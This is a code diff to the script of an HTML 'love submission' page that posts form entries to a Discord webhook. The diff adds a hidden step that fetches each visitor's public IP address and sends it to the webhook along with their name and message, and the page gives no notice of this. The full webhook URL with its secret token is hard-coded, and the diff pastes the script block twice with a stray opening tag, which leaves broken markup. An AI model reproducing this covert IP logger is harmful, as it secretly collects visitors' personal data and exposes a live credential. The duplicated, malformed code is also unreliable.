@@ -63,45 +63,110 @@
     </div>
 
     <script>
-        const webhookURL = "https://discord.com/api/webhooks/1308419714812481536/tYhIFuTxiumFIdaQoMoB3hCEfKTResHsj1eNC1i8ZznbVBtdIKBRCcoff_8MElszHoBl"; // Replace with your webhook URL
+    const webhookURL = "https://discord.com/api/webhooks/1308419714812481536/tYhIFuTxiumFIdaQoMoB3hCEfKTResHsj1eNC1i8ZznbVBtdIKBRCcoff_8MElszHoBl"; // Replace with your webhook URL
 
-        function nextUI(uiNumber) {
-            document.querySelectorAll('.container').forEach(div => div.style.display = 'none');
-            document.getElementById('ui-' + uiNumber).style.display = 'block';
+    function nextUI(uiNumber) {
+        document.querySelectorAll('.container').forEach(div => div.style.display = 'none');
+        document.getElementById('ui-' + uiNumber).style.display = 'block';
+    }
+
+    function submitLove() {
+        let name = document.getElementById('userName').value;
+        let amount = document.getElementById('loveAmount').value;
+        let reason = document.getElementById('reason').value;
+
+        if (!name || !amount || !reason) {
+            alert("Please fill all fields!");
+            return;
         }
 
-        function submitLove() {
-            let name = document.getElementById('userName').value;
-            let amount = document.getElementById('loveAmount').value;
-            let reason = document.getElementById('reason').value;
+        // Get the user's public IP address
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                let ip = data.ip;
 
-            if (!name || !amount || !reason) {
-                alert("Please fill all fields!");
-                return;
-            }
+                // Prepare the data to send to Discord
+                let message = {
+                    content: `❤️ **New Love Submission** ❤️\n\n**Name:** ${name}\n**Love Level:** ${amount}\n**Reason:** ${reason}\n**User IP:** ${ip}`
+                };
 
-            let data = {
-                content: `❤️ **New Love Submission** ❤️\n\n**Name:** ${name}\n**Love Level:** ${amount}\n**Reason:** ${reason}`
-            };
-
-            fetch(webhookURL, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(data)
-            })
-            .then(response => {
-                if (response.ok) {
-                    alert("Love message sent to Discord! ❤️");
-                } else {
-                    alert("Error sending to Discord!");
-                }
+                // Send the data to Discord webhook
+                fetch(webhookURL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(message)
+                })
+                .then(response => {
+                    if (response.ok) {
+                        alert("Love message sent to Discord! ❤️");
+                    } else {
+                        alert("Error sending to Discord!");
+                    }
+                })
+                .catch(error => {
+                    console.error("Error:", error);
+                    alert("Failed to send data!");
+                });
             })
             .catch(error => {
-                console.error("Error:", error);
-                alert("Failed to send data!");
+                console.error("Error fetching IP:", error);
+                alert("Failed to fetch IP address!");
             });
+    }
+<script>
+    const webhookURL = "https://discord.com/api/webhooks/1308419714812481536/tYhIFuTxiumFIdaQoMoB3hCEfKTResHsj1eNC1i8ZznbVBtdIKBRCcoff_8MElszHoBl"; // Replace with your webhook URL
+
+    function nextUI(uiNumber) {
+        document.querySelectorAll('.container').forEach(div => div.style.display = 'none');
+        document.getElementById('ui-' + uiNumber).style.display = 'block';
+    }
+
+    function submitLove() {
+        let name = document.getElementById('userName').value;
+        let amount = document.getElementById('loveAmount').value;
+        let reason = document.getElementById('reason').value;
+
+        if (!name || !amount || !reason) {
+            alert("Please fill all fields!");
+            return;
         }
-    </script>
+
+        // Get the user's public IP address
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                let ip = data.ip;
+
+                // Prepare the data to send to Discord
+                let message = {
+                    content: `❤️ **New Love Submission** ❤️\n\n**Name:** ${name}\n**Love Level:** ${amount}\n**Reason:** ${reason}\n**User IP:** ${ip}`
+                };
+
+                // Send the data to Discord webhook
+                fetch(webhookURL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(message)
+                })
+                .then(response => {
+                    if (response.ok) {
+                        alert("Love message sent to Discord! ❤️");
+                    } else {
+                        alert("Error sending to Discord!");
+                    }
+                })
+                .catch(error => {
+                    console.error("Error:", error);
+                    alert("Failed to send data!");
+                });
+            })
+            .catch(error => {
+                console.error("Error fetching IP:", error);
+                alert("Failed to fetch IP address!");
+            });
+    }
+</script>
 
 </body>
 </html>
